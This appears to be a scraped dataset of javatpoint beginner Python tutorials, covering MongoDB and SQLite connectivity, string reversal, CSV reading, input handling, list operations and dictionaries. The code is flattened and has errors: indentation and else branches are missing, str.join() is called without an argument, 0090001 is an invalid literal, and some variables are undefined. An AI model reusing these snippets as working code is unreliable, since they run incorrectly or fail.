82,['Python MongoDB Connectivity'],"['To create connection between Python programming language and MongoDB database, we need to first install pymongo driver. Here, we are creating an example that connects to the database and performs basic database operations. ']","['https://www.javatpoint.com/mongodb-atlas', 'https://www.javatpoint.com/php-mongodb', 'https://www.javatpoint.com/mongodb-atlas', 'https://www.javatpoint.com/php-mongodb', 'https://www.javatpoint.com/mongodb-atlas']","['https://static.javatpoint.com/mongodb/images/python-mongodb-connectivity1.png', 'https://static.javatpoint.com/mongodb/images/python-mongodb-connectivity2.png', 'https://static.javatpoint.com/mongodb/images/python-mongodb-connectivity3.png', 'https://static.javatpoint.com/mongodb/images/python-mongodb-connectivity4.png', 'https://static.javatpoint.com/mongodb/images/python-mongodb-connectivity5.png', 'https://static.javatpoint.com/mongodb/images/python-mongodb-connectivity6.png']",[],[],"['1) Install Driver', '2) Create Python File', '3) Execute Python Script', '4) Enter into Mongo Shell', '5) Check Databases', '6) Check Collection', '7) Access Records']",[],"['This example includes the following steps:', '// connect.py', 'This script prints the inserted record on the console. ', 'Now, enter into MongoDB database shell to see the created database and collection.', 'We can use following command to enter into the database.', 'The following command is used to show available databases.', 'The following command is used to show available collection into the database.', 'We can see the stored records in particular collection. The following command is used to show the record.']",[],[],"['$ pip install pymongo', 'from pymongo import MongoClient # import mongo client to connect', 'import pprint', '# Creating instance of mongoclient', 'client = MongoClient()', '# Creating database', 'db = client.javatpoint', 'employee = {""id"": ""101"",', '""name"": ""Peter"",', '""profession"": ""Software Engineer"",', '# Creating document', 'employees = db.employees', '# Inserting data', 'employees.insert_one(employee)', '# Fetching data', 'pprint.pprint(employees.find_one())', '> show dbs', '> show collections', '> db.employees.find()']",[],[],[]
83,['Connect SQLite with Python'],['First you have to install Python and SQLite on your syatem.'],"['https://www.javatpoint.com/sqlite-interview-questions', 'https://www.javatpoint.com/php-sqlite', 'https://www.javatpoint.com/sqlite-interview-questions', 'https://www.javatpoint.com/php-sqlite', 'https://www.javatpoint.com/sqlite-interview-questions']","['https://static.javatpoint.com/sqlite/images/connect-sqlite-with-python1.png', 'https://static.javatpoint.com/sqlite/images/connect-sqlite-with-python2.png', 'https://static.javatpoint.com/sqlite/images/connect-sqlite-with-python3.png', 'https://static.javatpoint.com/sqlite/images/connect-sqlite-with-python4.png', 'https://static.javatpoint.com/sqlite/images/connect-sqlite-with-python5.png']",[],"['Install Python', 'Install SQLite', 'SQLite with Python', 'Create a table ', 'Insert Records ', 'Select Records']",[],"['Note: To connect SQLite with Python, you do not need to install the connection module separately because its being shipped by default along with Python version 2.5.x onwards.']","['Use the following code:', 'Press y and installation will be completed within seconds.', 'Installation steps', 'type in the following command:', 'After installation check installation, sqlite terminal will give you a prompt and version info ?', 'Go to desired folder and create database:', 'sqlite3 database.db', ""It'll create database.db in the folder you've given the command."", 'To check if your database is created, use the following command in sqlite3 terminal:', 'Create a python file ""connect.py"", having the following code:', 'Execute the following statement on command prompt:', 'Now connection is created with the javatpoint database. Now you can create a table. ', 'Create a table ""Employees"" within the database ""javatpoint"".', 'Create a python file ""createtable.py"", having the following code:', 'Execute the following statement on command prompt:', 'A table ""Employees"" is created in the ""javatpoint"" database.', 'Insert some records in ""Employees"" table. ', 'Create a python file ""connection.py"", having the following code:', 'Execute the following statement on command prompt:', 'Records are inserted successfully.', 'Now you can fetch and display your records from the table ""Employees"" by using SELECT statement. ', 'Create a python file ""select.py"", having the following code:', 'Execute the following statement on command prompt:', 'See all the records you have inserted before. ', 'By same procedures, you can update and delete the table in SQLite database usnig Python. ']",[],[],"['sudo apt-get update', 'sudo apt-get upgrade python', 'sudo apt-get install sqlite3 libsqlite3-dev', '.databases', '#!/usr/bin/python', 'import sqlite3', ""conn = sqlite3.connect('javatpoint.db')"", 'print ""Opened database successfully"";', 'python connect.py', '#!/usr/bin/python', 'import sqlite3', ""conn = sqlite3.connect('javatpoint.db')"", 'print ""Opened database successfully"";', ""conn.execute('''CREATE TABLE Employees"", '(ID INT PRIMARY KEY     NOT NULL,', 'NAME           TEXT    NOT NULL,', 'AGE            INT     NOT NULL,', 'ADDRESS        CHAR(50),', ""SALARY         REAL);''')"", 'print ""Table created successfully"";', 'conn.close()', 'python createtable.py', '#!/usr/bin/python', 'import sqlite3', ""conn = sqlite3.connect('javatpoint.db')"", 'print ""Opened database successfully"";', 'conn.execute(""INSERT INTO Employees (ID,NAME,AGE,ADDRESS,SALARY) \\', 'VALUES (1, \'Ajeet\', 27, \'Delhi\', 20000.00 )"");', 'conn.execute(""INSERT INTO Employees (ID,NAME,AGE,ADDRESS,SALARY) \\', 'VALUES (2, \'Allen\', 22, \'London\', 25000.00 )"");', 'conn.execute(""INSERT INTO Employees (ID,NAME,AGE,ADDRESS,SALARY) \\', 'VALUES (3, \'Mark\', 29, \'CA\', 200000.00 )"");', 'conn.execute(""INSERT INTO Employees (ID,NAME,AGE,ADDRESS,SALARY) \\', 'VALUES (4, \'Kanchan\', 22, \'Ghaziabad \', 65000.00 )"");', 'conn.commit()', 'print ""Records inserted successfully"";', 'conn.close()', 'python connection.py', '#!/usr/bin/python', 'import sqlite3', ""conn = sqlite3.connect('javatpoint.db')"", 'data = conn.execute(""select * from Employees"");', 'for row in data:', 'print ""ID = "", row[0]', 'print ""NAME = "", row[1]', 'print ""ADDRESS = "", row[2]', 'print ""SALARY = "", row[3], ""\\n""', 'conn.close();', 'python select.py']",[],[],[]
84,['How to install Python in Windows?'],"[""Python is the most popular and versatile language in the current scenario. Python doesn't come with prepackage in Windows, but it doesn't mean that Window user cannot be flexible with Python. Some operating systems such as Linux come with the Python package manager that can run to install Python. Below are the steps to install Python in Windows.""]","['https://www.javatpoint.com/how-to-reverse-a-string-in-python', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/linux-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/windows', 'https://www.javatpoint.com/https://www.python.org/', 'https://www.javatpoint.com/how-to-reverse-a-string-in-python', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/how-to-reverse-a-string-in-python']","['https://static.javatpoint.com/python/images/how-to-install-python-in-windows.png', 'https://static.javatpoint.com/python/images/how-to-install-python-in-windows2.png', 'https://static.javatpoint.com/python/images/how-to-install-python-in-windows3.png']",[],[],"['Step - 1: Visit Official Site to Download Python Installer', 'Step -2 Install Python']","['Note - You can choose the Python installer according to your processor. If your system processor has 32-bit, then download Python 32-bit installer, otherwise go with the 64-bit version. If you are not sure about your processor, then download the 64-bit version.']","['Now Python is successfully installed in Windows, and you are ready to work with Python.']",[],[],[],[],[],"[""|||All Python-related information is available on its official website. First, open the browser and visit the official site (www.python.org) to install Python installer. Here, we can see the many Python installer versions, but we will download the latest version of Python.||||||It will take us on the above page. We can download the latest Python installer by clicking on the Download button. We can also download the older version. Let's see the following example.||||||Once the download is completed, then run the installer by double-clicking on the download file. It will ask for Add Python 3.8 to PATH. Click on the checkbox and click on Install Now navigator.|||""]"
85,['How to reverse a string in Python?'],"['Python String is the collection of the Unicode character. Python has numerous functions for string manipulation, but Python string library doesn\'t support the in-built ""reverse()"" function. But there are various ways to reverse the string. We are defining the following method to reverse the Python String.']","['https://www.javatpoint.com/how-to-read-csv-file-in-python', 'https://www.javatpoint.com/how-to-install-python-in-windows', 'https://www.javatpoint.com/https://www.javatpoint.com/python-strings', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/how-to-read-csv-file-in-python', 'https://www.javatpoint.com/how-to-install-python-in-windows', 'https://www.javatpoint.com/how-to-read-csv-file-in-python']",[],[],[],"['Using for loop', 'Using while loop', 'Using the slice ([]) operator', 'Using reverse function with join', 'Using recursion()']",[],"['Here, we will reverse the given string using for loop.', 'Explanation-', 'Next, the for loop iterated every element of the given string, join each character in the beginning and store in the str1 variable.', 'After the complete iteration, it returned the reverse order string str1 to the caller function. It printed the result to the screen.', ""We can also reverse a string using a while loop. Let's understand the following example."", 'Explanation:', 'In the above code, we have declared a str variable that holds string value. We initialized a while loop with a value of the string.', ""We can also reverse the given string using the extended slice operator. Let's understand the following example."", 'Explanation:', ""Python provides the reversed() function to reverse the string. Let's understand the following example."", 'Explanation:', 'The string can also be reversed using the recursion. Recursion is a process where function calls itself. Consider the following example.', 'Explanation:', 'In the above code, we have defined a function that accepts the string as an argument.', 'The slice operator slice the string expects the first character and concatenated to the end of the slice string.']","['In the above code, we have declared the reverse_string() function and passed the str argument. In the function body, we have declared empty string variable str1 that will hold the reversed string.', 'In each iteration, the value of str[count - 1] concatenated to the reverse_String and decremented the count value. A while completed its iteration and returned the reverse order string.', 'In the function body, we declared the empty string separated by .dot operator. The reversed() string returned the reverse string it joined with the empty string separated using the join() function.', 'In the function body, we defined the base condition of recursion, if a length of a string is 0, then the string is returned, and if not then we called the function recursively.']","['Generally, a slice operator accepts three parameters - start, stop and step. We provided the no value to start and end index, which indicates the start index is 0 and the end is n-1 by default. The step size is -1; it means the string continues the traverse from the end and goes to the 1 index position.']","['def reverse_string(str):', 'str1 = """"   # Declaring empty string to store the reversed string', 'for i in str:', 'str1 = i + str1', 'return str1    # It will return the reverse string to the caller function', 'str = ""JavaTpoint""    # Given String', 'print(""The original string is: "",str)', 'print(""The reverse string is"",reverse_string(str)) # Function call', '# Reverse string', '# Using a while loop', 'str = ""JavaTpoint"" #  string variable', 'print (""The original string  is : "",str)', 'reverse_String = """"  # Empty String', 'count = len(str) # Find length of a string and save in count variable', 'while count > 0:', 'reverse_String += str[ count - 1 ] # save the value of str[count-1] in reverseString', 'count = count - 1 # decrement index', 'print (""The reversed string using a while loop is : "",reverse_String)# reversed string', '#  Reverse a string', '# using  slice syntax', '# reverse(str) Function to reverse a string', 'def reverse(str):', 'str = str[::-1]', 'return str', 's = ""JavaTpoint""', 'print (""The original string  is : "",s)', 'print (""The reversed string using extended slice operator  is : "",reverse(s))', '#reverse a string using reversed()', '# Function to reverse a string', 'def reverse(str):', 'string = """".join(reversed(str)) # reversed() function inside the join() function', 'return string', 's = ""JavaTpoint""', 'print (""The original string is : "",s)', 'print (""The reversed string using reversed() is : "",reverse(s) )', '# reverse a string', '# using recursion', 'def reverse(str):', 'if len(str) == 0: # Checking the lenght of string', 'return str', 'else:', 'return reverse(str[1:]) + str[0]', 'str = ""Devansh Sharma""', 'print (""The original string  is : "", str)', 'print (""The reversed string(using recursion) is : "", reverse(str))']","[""('The original string is: ', 'JavaTpoint')"", ""('The reverse string is', 'tniopTavaJ')"", ""('The original string  is : ', 'JavaTpoint')"", ""('The reversed string using a while loop is : ', 'tniopTavaJ')"", ""('The original string  is : ', 'JavaTpoint')"", ""('The reversed string(using extended slice syntax) is : ', 'tniopTavaJ')"", ""('The original string is : ', 'JavaTpoint')"", ""('The reversed string using reversed() is : ', 'tniopTavaJ')"", ""('The original string is : ', 'JavaTpoint')"", ""('The reversed string(using reversed) is : ', 'tniopTavaJ')""]",[],['|||Using for loop|||Using while loop|||Using the slice operator|||Using the reversed() function|||Using the recursion|||']
86,['How to read CSV file in Python?'],"[""The CSV file stands for a comma-separated values file. It is a type of plain text file where the information is organized in the tabular form. It can contain only the actual text data. The textual data don't need to be separated by the commas (,). There are also many separator characters such as tab (\\t), colon(:), and semi-colon(;), which can be used as a separator. Let's understand the following example.""]","['https://www.javatpoint.com/how-to-run-python-program', 'https://www.javatpoint.com/how-to-reverse-a-string-in-python', 'https://www.javatpoint.com/how-to-run-python-program', 'https://www.javatpoint.com/how-to-reverse-a-string-in-python', 'https://www.javatpoint.com/how-to-run-python-program']",[],[],[],"['Example -', 'Explanation:']",[],"['Here, we have an example.txt file.']","['Now, we iterated the each row of the csv file object. The data is returned by removing the delimiters. The first row returned which contains the column names.']","[""In the above code, we imported the csv module to read the example.csv file. To read the csv, we pass our file's full path in the open() method. We used the built-in function csv.reader(), it takes two argument file object and delimiter. We initialized the count_line variable with 0. It counts the number of line from the csv file.""]","['name, rollno, Department', 'Peter Parker, 009001, Civil', 'Tony Stark, 009002, Chemical', '# Read CSV file example', '# Importing the csv module', 'import csv', '# open file by passing the file path.', ""with open(r'C:\\Users\\DEVANSH SHARMA\\Desktop\\example.csv') as csv_file:"", ""csv_read = csv.reader(csv_file, delimiter=',')  #Delimeter is comma"", 'count_line = 0', '# Iterate the file object or each row of the file', 'for row in csv_read:', 'if count_line == 0:', 'print(f\'Column names are {"", "".join(row)}\')', 'count_line += 1', 'else:', ""print(f'\\t{row[0]} roll number is:  {row[1]} and department is: {row[2]}.')"", 'count_line += 1', ""print(f'Processed {count_line} lines.') # This line will print number of line fro the file""]","['Column names are name, rollnu, Department', 'Peter Parker roll number is:  009001 and department is: Civil.', 'Tony Stark roll number is:  009002 and department is: Chemical.', 'Processed 3 lines.']",[],[]
87,['How to run Python Program?'],['Python programmers must know every possible way to run the Python scripts or code. This is the only way to verify whether code is working as we want. Python interpreter is responsible for executing the Python scripts. Python interpreter is a piece of software which works between the Python program and computer hardware. Here we are describing the series of ways to run Python scripts.'],"['https://www.javatpoint.com/how-to-take-input-in-python', 'https://www.javatpoint.com/how-to-read-csv-file-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/https://www.javatpoint.com/hardware', 'https://www.javatpoint.com/https://www.javatpoint.com/python-ides', 'https://www.javatpoint.com/how-to-take-input-in-python', 'https://www.javatpoint.com/how-to-read-csv-file-in-python', 'https://www.javatpoint.com/how-to-take-input-in-python']","['https://static.javatpoint.com/python/images/how-to-run-python-program.png', 'https://static.javatpoint.com/python/images/how-to-run-python-program2.png', 'https://static.javatpoint.com/python/images/how-to-run-python-program3.png', 'https://static.javatpoint.com/python/images/how-to-run-python-program4.png', 'https://static.javatpoint.com/python/images/how-to-run-python-program5.png']",[],[],"['The operating system command-line or Terminal', 'The Python interactive mode', 'The IDE or Text Editor', 'The file manager system']",[],"['We write the Python print statement and save it as sample.py in working directory. Now, we will run this file using the command-line.', 'Here is the example of how to run Python code using interactive shell.', 'Below are the few options to exit the interactive mode.', 'Create a new project and then create a new Python file using the .py extension.', 'Now, click on the green button and it will show the output as follows.']","['Open the command line to run a Python script. We need to type the python, followed by the file name to execute the file. Now, hit the enter key, and if there is no the error in file, we will see the output as follows.', 'To run the Python code, we can use the Python interactive session. We need to start Python interactive session, just open a command-line or terminal in start menu, then type in python, and press enter key.', 'It allows us to check every piece of code, and this facility makes it an awesome development tool. But once we close the session it will lose all code that we have written.', 'The Python file can run by double-clicking on its icon in a file manager. This process may not be widely used in the development stage. The file should be associated with the .py or .pyw with the program python.exe, respectively.']","[""We can run the Python code using a command line because in Python shell once we close the session, we will lose the complete code that we have written. So it is good to write a Python code using the plain text files. The text file must save as .py extension. Let's see the following example."", ""The IDE stands for Integrated Development Environment. There are various IDEs but Pycharm is Python's most popular and useful text editor among them. It is recommended for developing large and more complex applications. Here are using the Pycharm to run python script.""]",[],[],[],['|||The operating system command-line or terminal.|||The Python interactive mode.|||The IDE or Text editor|||The file manager of system.||||||Using the Python command line||||||Type built-in functions quit() or exit(). Or|||Type the enter ctrl+ Z key combination to end the current session of Python interactive shell.|||']
88,['How to take input in Python?'],"['Taking input is a way of interact with users, or get data to provide some result. Python provides two built-in methods to read the data from the keyboard. These methods are given below.']","['https://www.javatpoint.com/how-to-convert-list-to-string-in-python', 'https://www.javatpoint.com/how-to-run-python-program', 'https://www.javatpoint.com/https://www.javatpoint.com/python-built-in-functions', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/how-to-convert-list-to-string-in-python', 'https://www.javatpoint.com/how-to-run-python-program', 'https://www.javatpoint.com/how-to-convert-list-to-string-in-python']","['https://static.javatpoint.com/python/images/how-to-take-input-in-python.png', 'https://static.javatpoint.com/python/images/how-to-take-input-in-python2.png']",[],"['input()', 'How to check Python version?']",['How input() function works?'],[],"['The Python interpreter will not execute further lines until the user enters the input.', ""Let's understand another example."", 'Example - 2', 'Explanation:', 'We can see in the above code where we type casted the user input into int and float.', 'Check Python version in the running script', 'We can check the Python version in our running script. Consider the following ways to know Python version in all operating systems.', ""Let's have a look at following image.""]","['By default, the input() function takes input as a string so if we need to enter the integer or float type input then the input() function must be type casted.', 'To check the Python version, open command line (Windows), shell (Mac), or terminal (Linux/Ubuntu) and run python -version. It will display the corresponding Python version.']","[""The input function is used in all latest version of the Python. It takes the input from the user and then evaluates the expression. The Python interpreter automatically identifies the whether a user input a string, a number, or a list. Let's understand the following example.""]","['# Python program showing', '# a use of input()', 'name = input(""Enter your name: "")', 'print(name)', '# Python program showing', '# a use of input()', 'name = input(""Enter your name: "")  # String Input', 'age = int(input(""Enter your age: "")) # Integer Input', 'marks = float(input(""Enter your marks: "")) # Float Input', 'print(""The name is:"", name)', 'print(""The age is:"", age)', 'print(""The marks is:"", marks)', 'age = int(input(""Enter your age: "")) # Integer Input', 'marks = float(input(""Enter your marks: "")) # Float Input', '# Python program showing', '# a use of raw_input()', 'name = raw_input(""Enter your name : "")', 'print name']","['Enter your name: Devansh', 'Devansh', 'Enter your name: Johnson', 'Enter your age: 21', 'Enter your marks: 89', 'The name is: Johnson', 'The age is 21', 'The marks is: 89.0', 'Enter your name: Peter', 'Peter']","[""Commands|||Operating System/Environment|||Output&&&Python --version or|||Python -v or|||Python -vv|||Window/Mac/Linux|||Python 3.8.1&&&import sys|||sys.version|||sys.version_info|||Python Script|||3.8.3 (default, May 13 2020, 15:29:51) [MSC v.1915 64 bit (AMD64)]&&&Import platform|||platform.python_version()||||||Python Script|||'3.8.1'""]","[""|||input(prompt)|||raw_input(prompt)||||||The flow of the program has stopped until the user enters the input.|||The text statement which also knows as prompt is optional to write in input() function. This prompt will display the message on the console.|||The input() function automatically converts the user input into string. We need to explicitly convert the input using the type casting.|||raw_input() - The raw_input function is used in Python's older version like Python 2.x. It takes the input from the keyboard and return as a string. The Python 2.x doesn't use much in the industry. Let's understand the following example.|||""]"
89,['How to convert list to string in Python?'],"[""The Python list can be converted into string by using the following methods. Let's understand the following methods.""]","['https://www.javatpoint.com/how-to-append-element-in-the-list', 'https://www.javatpoint.com/how-to-take-input-in-python', 'https://www.javatpoint.com/how-to-append-element-in-the-list', 'https://www.javatpoint.com/how-to-take-input-in-python', 'https://www.javatpoint.com/how-to-append-element-in-the-list']",[],[],[],"['Method - 1', 'Method -2 Using .join() method', 'Method - 3', 'Method - 4']",[],"['The given string iterates using for loop and adds its element to string variable.', 'We can also use the .join() method to convert the list into string.', 'Example - 2', 'Using list comprehension', 'Using map()']",['The above method is not recommended when a list contains both string and integer as its element. Use the adding element to string variable in such scenario.'],[],"['# List is converting into string', 'def convertList(list1):', ""str = ''  # initializing the empty string"", 'for i in list1: #Iterating and adding the list element to the str variable', 'str += i', 'return str', 'list1 = [""Hello"","" My"", "" Name is "",""Devansh""] #passing string', 'print(convertList(list1)) # Printin the converted string value', '# List is converting into string', 'def convertList(list1):', ""str = ''  # initializing the empty string"", 'return (str.join()) # return string', 'list1 = [""Hello"","" My"", "" Name is "",""Devansh""] #passing string', 'print(convertList(list1)) # Printin the converted string value', '# Converting list into string using list comprehension', 'list1 = [""Peter"", 18, ""John"", 20, ""Dhanuska"",26]', ""convertList = ' '.join([str(e) for e in list1]) #List comprehension"", 'print(convertList)', '# Converting list into string using list comprehension', 'list1 = [""Peter"", 18, ""John"", 20, ""Dhanuska"",26]', ""convertList = ' '.join(map(str,list1)) # using map funtion"", 'print(convertList)']","['Hello My Name is Devansh', 'Hello My Name is Devansh', 'Peter 18 John 20 Dhanuska 26', 'Peter 18 John 20 Dhanuska 26']",[],[]
90,['How to append element in the list'],['Python provides built-in methods to append or add elements to the list. We can also append a list into another list. These methods are given below.'],"['https://www.javatpoint.com/how-to-compare-two-lists-in-python', 'https://www.javatpoint.com/how-to-convert-list-to-string-in-python', 'https://www.javatpoint.com/how-to-compare-two-lists-in-python', 'https://www.javatpoint.com/how-to-convert-list-to-string-in-python', 'https://www.javatpoint.com/how-to-compare-two-lists-in-python']",[],[],[],"['1. append(elmt)', '2. insert(index, elmt)', '3. extend(iterable)']",[],"[""Let's understand these methods by the following example."", 'This function is used to add the element at the end of the list. The example is given below.']","['The insert() function adds the elements at the given an index position. It is beneficial when we want to insert element at a specific position. The example is given below.', 'The extends() function is used to add the iterable elements to the list. It accepts iterable object as an argument. Below is the example of adding iterable element.']",[],"['names = [""Joseph"", ""Peter"", ""Cook"", ""Tim""]', ""print('Current names List is:', names)"", 'new_name = input(""Please enter a name:\\n"")', 'names.append(new_name)  # Using the append() function', ""print('Updated name List is:', names)"", 'list1 = [10, 20, 30, 40, 50]', ""print('Current Numbers List: ', list1)"", 'el = list1.insert(3, 77)', 'print(""The new list is: "",list1)', 'n = int(input(""enter a number to add to list:\\n""))', ""index = int(input('enter the index to add the number:\\n'))"", 'list1.insert(index, n)', ""print('Updated Numbers List:', list1)"", 'list1 = [10,20,30]', 'list1.extend([""52.10"", ""43.12"" ])  # extending list elements', 'print(list1)', 'list1.extend((40, 30))  # extending tuple elements', 'print(list1)', 'list1.extend(""Apple"")  # extending string elements', 'print(list1)']","[""Current names List is: ['Joseph', 'Peter', 'Cook', 'Tim']"", 'Please enter a name:', 'Devansh', ""Updated name List is: ['Joseph', 'Peter', 'Cook', 'Tim', 'Devansh']"", 'Current Numbers List:  [10, 20, 30, 40, 50]', 'The new list is:  [10, 20, 30, 77, 40, 50]', 'enter a number to add to list:', '45', 'enter the index to add the number:', '1', 'Updated Numbers List: [10, 45, 20, 30, 77, 40, 50]', ""[10, 20, 30, '52.10', '43.12']"", ""[10, 20, 30, '52.10', '43.12', 40, 30]"", ""[10, 20, 30, '52.10', '43.12', 40, 30, 'A', 'p', 'p', 'l', 'e']""]",[],"['|||append(elmt) - It appends the value at the end of the list.|||insert(index, elmt) - It inserts the value at the specified index position.|||extends(iterable) - It extends the list by adding the iterable object.|||']"
91,['How to compare two lists in Python'],"['Python provides multiple ways to compare the two lists. Comparison is the process when the data items of are checked against another data item of list, whether they are the same or not.']","['https://www.javatpoint.com/how-to-convert-int-to-string-in-python', 'https://www.javatpoint.com/how-to-append-element-in-the-list', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-set-function', 'https://www.javatpoint.com/how-to-convert-int-to-string-in-python', 'https://www.javatpoint.com/how-to-append-element-in-the-list', 'https://www.javatpoint.com/how-to-convert-int-to-string-in-python']",[],[],[],"['The cmp() function', 'The set() function and == operator', 'Explanation:', 'The sort() method with == operator', 'The collection.counter() function', 'The reduce() and map()']","[""Note - It doesn't use in Python 3.x version."", 'Note - In the sort() method, we can pass the list items in any order because we are sorting the list before comparison.', ""Note - The order of the list's elements doesn't matter in this function."", 'Note - We need to import the functool module to use the reduce() function.']","['The methods of comparing two lists are given below.', 'The Python cmp() function compares the two Python objects and returns the integer values -1, 0, 1 according to the comparison.', ""Python sort() function is used to sort the lists. The same list's elements are the same index position it means; lists are equal."", ""Let's understand the following example -"", 'Besides, The reduce() method implements the given function to the iterable object recursively.', ""Let's understand the following example."", 'In this section, we have covered various methods of comparing two lists in Python. ']","[""Python set() function manipulate the list into the set without taking care of the order of elements. Besides, we use the equal to operator (==) to compare the data items of the list. Let's understand the following example."", ""The collection module provides the counter(), which compare the list efficiently. It stores the data in dictionary format <value>:<frequency> and counts the frequency of the list's items."", 'The map() function accepts a function and Python iterable object (list, tuple, string, etc) as an arguments and returns a map object. The function implements to each element of the list and returns an iterator as a result.', 'Here, we will use both methods in combination. The map() function would implement the function (it can be user-define or lambda function) to every iterable object and the reduce() function take care of that would apply in recursive manner.']","['In the above example, we have declared the two lists to be compared with each other. We converted those lists into the set and compared each element with the help of == operator. All elements are equal in both lists, then if block executed and printed the result.']","['list1 - [11, 12, 13, 14, 15]', 'list2 - [11, 12, 13, 14, 15]', 'Output - The lists are equal', 'list1 = [11, 12, 13, 14, 15]', 'list2 = [12, 13, 11, 15, 14]', 'a = set(list1)', 'b = set(list2)', 'if a == b:', 'print(""The list1 and list2 are equal"")', 'print(""The list1 and list2 are not equal"")', 'import collections', 'list1 = [10, 20, 30, 40, 50, 60]', 'list2 = [10, 20, 30, 50, 40, 70]', 'list3 = [50, 10, 30, 20, 60, 40]', '# Sorting the list', 'list1.sort()', 'list2.sort()', 'list3.sort()', 'if list1 == list2:', 'print(""The list1 and list2 are the same"")', 'print(""The list1 and list3 are not the same"")', 'if list1 == list3:', 'print(""The list1 and list2 are not the same"")', 'print(""The list1 and list2 are not the same"")', 'import collections', 'list1 = [10, 20, 30, 40, 50, 60]', 'list2 = [10, 20, 30, 50, 40, 70]', 'list3 = [50, 10, 30, 20, 60, 40]', 'if collections.Counter(list1) == collections.Counter(list2):', 'print(""The lists l1 and l2 are the same"")', 'print(""The lists l1 and l2 are not the same"")', 'if collections.Counter(list1) == collections.Counter(list3):', 'print(""The lists l1 and l3 are the same"")', 'print(""The lists l1 and l3 are not the same"")', 'import functools', 'list1 = [10, 20, 30, 40, 50]', 'list2 = [10, 20, 30, 50, 40, 60, 70]', 'list3 = [10, 20, 30, 40, 50]', 'if functools.reduce(lambda x, y: x and y, map(lambda a, b: a == b, list1, list2), True):', 'print(""The list1 and list2 are the same"")', 'print(""The list1 and list2 are not the same"")', 'if functools.reduce(lambda x, y: x and y, map(lambda a, b: a == b, list1, list3), True):', 'print(""The list1 and list3 are the same"")', 'print(""The list1 and list3 are not the same"")']","['The list1 and list2 are equal', 'The list1 and list3 are not the same', 'The list1 and list2 are not the same', 'The lists list1 and list2 are not the same', 'The lists list1 and list3 are the same', 'The list1 and list2 are not the same', 'The list1 and list3 are the same']",[],['|||The cmp() function|||The set() function and == operator|||The sort() function and == operator|||The collection.counter() function|||The reduce() and map() function|||']
92,['How to convert int to string in Python'],"['We can convert an integer data type using the Python built-in str() function. This function takes any data type as an argument and converts it into a string. But we can also do it using the ""%s"" literal and using the .format() function. Below is the syntax of the str() function.']","['https://www.javatpoint.com/how-to-create-a-dictionary-in-python', 'https://www.javatpoint.com/how-to-compare-two-lists-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-str-function', 'https://www.javatpoint.com/how-to-create-a-dictionary-in-python', 'https://www.javatpoint.com/how-to-compare-two-lists-in-python', 'https://www.javatpoint.com/how-to-create-a-dictionary-in-python']",[],[],[],[],[],"[""Let's understand the following example."", 'Example - 1 Using the str() function', 'Example - 2 Using the ""%s"" integer', 'Example - 3: Using the .format() function', 'Example - 4: Using f-string', 'We have defined all methods of converting the integer data type to the string type. You can use one of them according to your requirement.']",[],[],"['str(integer_Value)', '# check  and print type of num variable', 'print(type(n))', 'print(n)', '# convert the num into string', 'con_num = str(n)', '# check  and print type converted_num variable', 'print(type(con_num))', 'print(con_num)', '# check and print type of n variable', 'print(type(n))', '# convert the num into a string and print', 'con_n = ""% s"" % n', 'print(type(con_n))', '# check  and print type of num variable', 'print(type(n))', '# convert the num into string and print', 'con_n = ""{}"".format(n)', 'print(type(con_n))', '# check  and print type of num variable', 'print(type(n))', '# convert the num into string', ""conv_n = f'{n}'"", '# print type of converted_num', 'print(type(conv_n))']","[""<class 'int'>"", '25', ""<class 'str'>"", '25', ""<class 'int'>"", ""<class 'str'>"", ""<class 'int'>"", ""<class 'str'>"", ""<class 'int'>"", ""<class 'str'>""]",[],[]
93,['How to create a dictionary in Python'],"['A Python dictionary is stored the data in the pair of key-value. It organizes the data in a unique manner where some specific value exists for some particular key. It is a mutable data-structure; its element can be modified after creation. Before creating a dictionary, we should remember the following points.']","['https://www.javatpoint.com/how-to-create-a-virtual-environment-in-python', 'https://www.javatpoint.com/how-to-convert-int-to-string-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-dict-function', 'https://www.javatpoint.com/how-to-create-a-virtual-environment-in-python', 'https://www.javatpoint.com/how-to-convert-int-to-string-in-python', 'https://www.javatpoint.com/how-to-create-a-virtual-environment-in-python']",[],[],[],['Creating a Dictionary'],[],"['In the above dictionary, the Name, Age, Rollnu are the keys which immutable object and James, 25, 0090001 are its values.', ""Let's see the following example."", 'The dictionary is mostly used to store a large amount of data where we can access any value by its key.']","['The dictionary is created using the multiple key-value pair, which enclosed within the curly brackets {}, and each key is separated from its value by the colon (:). The syntax is given below.', ""The empty curly bracket {} is used to create empty dictionary. We can also create dictionary using the built-in dict() function. Let's understand the following example.""]",[],"['dict1 = {""Name"": ""James"", ""Age"": 25, ""Rollnu"": 0090001 }', 'Student = {""Name"": ""John"", ""Age"": 10, ""Result"":""Passed"",""Rollno"":""009001""}', 'print(type(Student))', 'print(""printing Employee data .... "")', 'print(Student)', 'dict = {}', 'print(""Empty Dictionary is: "")', 'print(dict)', '# Creating a Dictionary', '# using the dict() method', ""dict1 = dict({1: 'Hello', 2: 'Hi', 3: 'Hey'})"", 'print(""\\nCreate Dictionary by using the dict() method : "")', 'print(dict1)', '# Creating a Dictionary', '# with each item as a Pair', ""dict2 = dict([('Devansh', 90014), ('Arun', 90015)])"", 'print(""\\nDictionary with each item as a pair: "")', 'print(dict2)']","[""<class 'dict'>"", 'printing Employee data ....', ""{'Name': 'John', 'Age': 10, 'Result': 'Passed', 'Rollno': '009001'}"", 'Empty Dictionary is:', '{}', 'Create Dictionary by using the dict() method :', ""{1: 'Hello', 2: 'Hi', 3: 'Hey'}"", 'Dictionary with each item as a pair:', ""{'Devansh': 90014, 'Arun': 90015}""]",[],"['|||Keys must be unique and must contain a single value.|||Values can be any type, such as integer, list, tuple, string, etc.|||Keys must be immutable.|||']"
